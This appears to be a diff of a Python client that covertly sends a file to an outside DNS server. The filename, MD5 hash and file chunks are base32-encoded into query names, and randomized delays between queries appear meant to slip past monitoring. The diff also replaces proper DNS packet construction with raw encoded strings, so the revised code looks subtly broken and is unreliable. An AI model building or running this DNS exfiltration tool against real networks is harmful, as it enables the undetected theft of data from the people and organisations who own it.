@@ -4,7 +4,6 @@ import hashlib
 import os
 import time
 import random
-from dnslib import DNSRecord, QTYPE
 
 DNS_SERVER = "your.dns.server.ip"  # Replace with actual DNS server IP
 DNS_PORT = 53
@@ -20,24 +19,20 @@ def calculate_md5(file_path):
 
 # Function to send a DNS query with a random delay based on user input
 def send_dns_query(data, server_ip, max_delay):
-    # Build a valid DNS query using dnslib
-    query = DNSRecord.question(data, qtype=QTYPE.TXT)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.sendto(query.pack(), (server_ip, DNS_PORT))
+    sock.sendto(data.encode(), (server_ip, DNS_PORT))
     
     # Add a random delay between 0.1 seconds and the user-provided maximum delay
     delay = random.uniform(0.1, max_delay)
     print(f"Query sent, delaying next query by {delay:.2f} seconds.")
     time.sleep(delay)
 
-# Function to send file in chunks with randomized query sending and remaining chunks counter
+# Function to send file in chunks with a chunk counter
 def send_file_chunks(file_path, server_ip, domain, max_delay):
     file_size = os.path.getsize(file_path)
     chunk_size = 512  # Size of each chunk in bytes (adjust as needed)
     total_chunks = (file_size // chunk_size) + (1 if file_size % chunk_size else 0)
-
-    # Counter for remaining chunks
-    remaining_chunks = total_chunks
+    print(f"Total chunks to send: {total_chunks}")
 
     with open(file_path, "rb") as file:
         for chunk_number in range(total_chunks):
@@ -45,12 +40,9 @@ def send_file_chunks(file_path, server_ip, domain, max_delay):
             encoded_chunk_data = base64.b32encode(chunk_data).decode().strip("=")
 
             # Use a static "chunk" prefix for all chunk queries
-            query_name = f"c{chunk_number}.{encoded_chunk_data}.{domain}"
-            print(f"Sending chunk {chunk_number}, {remaining_chunks - 1} chunks remaining.")
-            send_dns_query(query_name, server_ip, max_delay)
-
-            # Decrement the remaining chunks counter
-            remaining_chunks -= 1
+            query = f"c{chunk_number}.{encoded_chunk_data}.{domain}"
+            print(f"Sending chunk {chunk_number + 1}/{total_chunks}")
+            send_dns_query(query, server_ip, max_delay)
 
 # Function to send file information (filename and MD5 hash)
 def send_file_info(file_name, file_md5, server_ip, domain, max_delay):
@@ -58,16 +50,16 @@ def send_file_info(file_name, file_md5, server_ip, domain, max_delay):
     encoded_file_name = base64.b32encode(file_name.encode()).decode().strip("=")
     encoded_file_md5 = base64.b32encode(file_md5.encode()).decode().strip("=")
 
-    query_name = f"f.{encoded_file_name}.{encoded_file_md5}.{domain}"
+    query = f"f.{encoded_file_name}.{encoded_file_md5}.{domain}"
     print(f"Sending file info: {file_name}, MD5: {file_md5}")
-    send_dns_query(query_name, server_ip, max_delay)
+    send_dns_query(query, server_ip, max_delay)
 
 # Function to signal end of transmission
 def send_end_signal(server_ip, domain, max_delay):
     # Use static "end" prefix for the end-of-transmission signal
-    query_name = f"e.end.{domain}"
+    query = f"e.end.{domain}"
     print("Sending end of transmission signal")
-    send_dns_query(query_name, server_ip, max_delay)
+    send_dns_query(query, server_ip, max_delay)
 
 # Main client function
 def send_file(file_path, max_delay):
@@ -77,7 +69,7 @@ def send_file(file_path, max_delay):
     # Send file info (filename and MD5 hash)
     send_file_info(file_name, file_md5, DNS_SERVER, domain, max_delay)
 
-    # Send file chunks with random delays and show remaining chunks
+    # Send file chunks with chunk counter and random delays
     send_file_chunks(file_path, DNS_SERVER, domain, max_delay)
 
     # Signal the end of transmission
